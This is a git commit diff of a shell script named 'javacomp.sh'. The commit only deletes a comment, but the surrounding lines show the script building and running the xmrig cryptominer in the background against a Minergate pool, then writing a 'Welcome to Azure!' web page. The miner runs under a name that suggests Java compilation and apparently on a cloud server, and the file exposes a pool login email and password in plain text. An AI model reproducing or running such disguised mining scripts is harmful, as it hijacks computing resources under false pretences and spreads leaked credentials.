d7623235d9a9a63eee4241922c800d824694a602
sctrade1 <37348975+sctrade1@users.noreply.github.com>
2018-10-29 18:54:10 +0200

    Update javacomp.sh

--- javacomp.sh
+++ javacomp.sh
@@ -4,5 +4,4 @@ cd build
 cmake ..
 make
 ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u zhmuha@yahoo.com -p Barb#dos66 -t 4 --donate-level=1 --av=2 -B
-# Set the home page.
 echo "<html><body><h2>Welcome to Azure! My name is Scherny.</h2></body></html>" | sudo tee -a /var/www/html/index.html
